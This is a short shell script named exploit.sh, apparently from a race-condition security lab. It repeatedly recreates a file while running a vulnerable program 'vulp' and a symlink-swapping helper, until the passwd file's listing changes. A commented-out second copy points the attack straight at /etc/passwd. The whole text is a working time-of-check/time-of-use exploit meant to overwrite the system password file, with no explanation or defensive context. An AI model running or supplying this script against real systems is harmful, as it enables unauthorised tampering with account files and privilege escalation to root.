#!/bin/sh # exploit.sh
old=`ls -l passwd`
new=`ls -l passwd`
while [ "$old" = "$new" ]
	do 
		rm xyz;
		echo "This is a file that the user can overwrite" > xyz 
		echo "Attack-Success" | ./vulp xyz & ./createLink xyz & new=`ls -l passwd`
done
echo "The passwd file has been changed"

#!/bin/sh # exploit.sh
#old=`ls -l /etc/passwd`
#new=`ls -l /etc/passwd`
#while [ "$old" = "$new" ]
#	do 
#		rm /tmp/XYZ;
#		echo "This is a file that the user can overwrite" > /tmp/XYZ 
#		echo "Attack Success" | ./vulp /tmp/XYZ & ./createLink /tmp/XYZ #& new=`ls -l /etc/passwd`
#done
#echo "STOP… The passwd file has been changed"
